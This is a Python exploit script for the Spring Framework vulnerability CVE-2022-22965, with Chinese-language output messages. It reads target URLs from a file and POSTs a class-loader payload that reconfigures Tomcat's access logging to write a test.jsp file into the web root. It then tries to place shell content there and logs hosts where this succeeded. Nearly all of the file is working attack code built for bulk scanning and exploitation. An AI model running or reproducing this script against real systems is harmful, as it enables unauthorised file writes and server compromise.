import requests
import threading
import sys
import urllib3
urllib3.disable_warnings()
a ='''
   $$$   $$  $$  $$$$$        $$$    $$$    $$$    $$$         $$$    $$$    $$$    $$$   $$$$$    
 $$  $  $$  $$  $$          $  $$  $$ $$  $  $$  $  $$       $  $$  $  $$  $$ $$  $$     $$       
 $$     $$  $$  $$             $$  $$ $$     $$     $$          $$     $$  $$ $$  $$$$   $$$$     
 $$      $$$$   $$$$$  $$$    $$   $$ $$    $$     $$   $$$    $$     $$   $$ $$  $$ $$     $$    
 $$      $$$$   $$           $$    $$ $$   $$     $$          $$     $$     $$$$  $$ $$     $$    
 $$  $   $$$$   $$          $$     $$ $$  $$     $$          $$     $$        $$  $$ $$  $  $$    
  $$$     $$    $$$$$       $$$$$   $$$   $$$$$  $$$$$       $$$$$  $$$$$   $$$    $$$    $$$      
                                                                                    
'''
print(a)
def getshell(url):

    shell ='123'
    headers2={
            'test1':shell
    }
    try:
        req_shell = requests.get(url, headers=headers2, verify=False, timeout=5)
        code2=req_shell.status_code
        succ = url + 'test.jsp'
        req_shell_succ=requests.get(succ)
        if code2 == 200:
            print(f'[+]成功写入shell：{url}test.jsp')
            succ_shell = url + 'test.jsp'
            poc_file = open('succ.txt', 'a+')
            poc_file.write(succ_shell + '\n')
            poc_file.close()
        else:
            print(f'[-]{url}写入shell失败,请重新测试')
    except requests.exceptions.RequestException:
        print(f'[-]{url} 写入shell超时')
        pass
    except:
        print(f'[-]{url} 写入shell其他异常')
        pass
def scan(txt):

    # shell =""
    headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
    }
    path ='webapps/ROOT'
    data='''class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Btest1%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory='''+path+'''&class.module.classLoader.resources.context.parent.pipeline.first.prefix=test&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='''

    # print(data)
    #去修改参数
    f = open(txt)
    urllist=f.readlines()
    for url in urllist:
        url= url.strip('\r\n')
        url=url.strip('/')
        url=url+'/'
        # url.strip()
        try:
            req_jsp=requests.post(url,headers=headers1,data=data,verify=False,timeout=3)
            code =req_jsp.status_code
            if code ==200:
                print(f'[+]{url}疑似存在漏洞')
                print('正在尝试写入shell')
                getshell(url)
            else:
                print(f'[-]{url}不存在漏洞')
        except requests.exceptions.RequestException:
            print(f'[-]{url} 检测超时')
            pass
        except:
            print(f'[-]{url} 检测其他异常')
            pass

if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        t = threading.Thread(target=scan(cmd1))
        t.start()
    except:
        print('用法：')
        print('python CVE-2022-22965-POC.py url.txt')
        pass


